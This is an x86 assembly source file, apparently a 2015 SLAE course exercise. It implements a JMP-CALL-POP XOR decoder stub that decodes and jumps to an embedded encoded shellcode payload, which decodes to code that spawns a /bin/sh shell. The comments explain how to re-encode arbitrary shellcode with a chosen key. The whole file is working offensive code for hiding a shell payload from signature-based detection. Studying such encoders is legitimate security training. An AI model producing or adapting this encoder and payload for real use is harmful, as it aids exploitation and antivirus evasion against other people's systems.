; Filename    : decoder.asm
; Author      : Joris Hartog
; Date        : 22-11-2015
; Student     : SLAE-704
; Size        : 25 (code) + 1 (key) + 21 (decoder) = 47
; Description : To encode the shellcode, choose any byte,
;  write it below after the label "key: db" and bitwise 
;  XOR the shellcode with it. Don't forget to adjust the
;  shellcode length (+1 for the key) in the ecx register.
;
;  This code uses the JMP-CALL-POP method.

global _start

section .text

_start:

	jmp short shellcodeCall

continueCode:
	
	pop esi			; esi contains pointer to key
	xor ecx, ecx
	mov cl, 26		; ecx contains 26
	mov al, byte [esi]	; eax contains the key

decode:

	xor byte [esi], al
	inc esi 

        loop decode

	jmp short shellcode

shellcodeCall:

	call continueCode
        key: db 0xaa
        shellcode: db 0x9b,0x6a,0xfa,0x23,0x48,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
